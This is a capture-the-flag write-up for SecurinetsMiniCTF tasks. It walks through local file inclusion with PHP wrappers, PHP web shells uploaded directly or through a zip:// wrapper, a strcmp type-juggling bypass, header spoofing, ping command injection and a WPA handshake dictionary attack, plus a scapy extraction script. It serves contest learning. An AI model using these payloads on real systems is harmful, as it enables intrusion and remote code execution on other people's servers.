# SecurinetsMiniCTF Writeups #
Hello guys , you will find here writeups of SecurinetsMiniCTF tasks written by Kahla (Meeeeeee ! ) , i want to apologize for the lack of details in these solvers , i really didn't have enough time (exams are sooon :'( ) anyways don't hesitate and contact me if you had any problems 

## Warm Up () ##

In this task we are given a simple web page showing an include statement , the idea is simple this is a local file inclusion LFI and our goal is to read flag.php content so we will use php wrappers .

***Payload*** : 
> url/_=php://filter/convert.base64-encode/resource=flag.php
we will then have the flag.php content encoded with base64 , so after decoding it we get our flag 

## Up V2 () ##

In this task we are given an upload page, in fact there are two solutions 

- ***The unintended*** one which i think pretty easy xd :

you only have to upload a php shell with the name "foo.jpg.php"
**Example :**

Content of foo.jpg.php :
```php
<?php system($_GET('command')); ?> 
```
and then we just have to visit 
>/uploads/foo.jpg.php?command=YourCommandHere  

- ***The Intended Solution:***

We can notice that there is a possibility of an LFI in the page parameter but unfortunately all the known php wrappers are filtered (The Author is 3vil)

Because of the existence of the upload feature we can think of the possibility of using the zip wrapper
so firstly we create foo.php file : 
```php
<?php system($_GET['command']) ; ?>
```

Then we have to compress the file :
> zip foo.zip foo.php

and rename it to foo.jpg :
> mv foo.zip foo.jpg

and finally after uploading the foo.jpg file our payload will be :
>/?page=zip://uploads/foo.jpg%23foo.php

Now the foo.php will be unzipped and we will have the possibility to execute any command with 
>foo.php?command=YourCommandHere(ls first to list all files and then cat the flag file)

## ##
We are given a page with php code inside , there are two conditions we need to bypass to have our beloved flag , 

- First check :
> if(file_get_contents(@$_GET['__'])==="Kahla is my hero")

in order to bypass this condition we will have to use the input php wrapper 
- The second condition :
>if(strcmp(@$_GET['_'],$pass)==0)

We will exploit php type juggling, in php NULL==0 will return True so we will try to pass an array as a parameter then the strcmp (AnArray,$pass) will return Null 

***Finally this is our payload :***
> /?__=php://input&_[]= 

And don't forget to write the sentence "Kahla is my hero" in the body of the Http request(you can use burp to facilitate things)

## No Clues () ##
In this task we got a picture of the admin connecting to a web server through proxies so we can think that maybe we will use X-forwarded-for http header , You can read about it here [LINK](https://en.wikipedia.org/wiki/X-Forwarded-For)

![TASK](https://i.imgur.com/aBTtnLy.jpg)

As we can see in this wikipedia article , the X-forwarded-for header adds automatically the last connected proxy (proxy 3
in our case which is a load balancer maybe)
>    X-Forwarded-For: client, proxy1, proxy2
where the value is a comma+space separated list of IP addresses, the left-most being the original client, and each successive proxy that passed the request adding the IP address where it received the request from. In this example, the request passed through proxy1, proxy2, and then proxy3 (not shown in the header).

so we will add this header to our http request using burp suite: 
>X-Forwarded-For:adminIP,Proxy1,Proxy2 ***(replace each one with its ip address xd)***

Bingo we are now connected as an admin and we have a simple web page that pings any ip we provide , this step is pretty simple by entering :
>11;ls 

we can have an RCE , so our last payload is 
>12;cat z21851ddfde521782z8

## More Than A Crush 2 () ##

In this Forensics task , we were given a wireshark capture ,each ICMP packet of type 0 hold within it some raw data that's why we ll extract it using scapy library in python , concatenate all this data and then decode it 

![TASK](https://i.imgur.com/429tPOP.png)


```python
#!/usr/bin/env python

from scapy.all import *
import base64

#EXTRACT RAW FLAG
def extract_flag():
    bin=""
    packets=rdpcap("morecv2.pcapng")
    for pckt in packets :
        if pckt.haslayer(scapy.all.ICMP) :
            if pckt[scapy.all.ICMP].type==0:
                try:
#                     pckt[scapy.all.ICMP].show()
                    bin+=pckt[scapy.all.Raw].load
                except ValueError:
                    continue    
    return bin            

#MAIN

raw_bin=extract_flag()    
#DECODE Base64 AND CREATE THE ZIP FILE
with open("youuupi.zip","wb") as file:
	file.write(base64.b64decode(raw_bin))
```
Finally you only have to unzip the extracted file and then use strings tool to have the flag

## ##
This task is pretty simple , we have a pcap file of a handshake so we need to get the password of this access point in order to submit it, we will launch a dictionary attack

>aircrack-ng <filename>.pcap -w /usr/share/wordlists/rockyou.txt

And Bingo the password is ***gohan123***
  
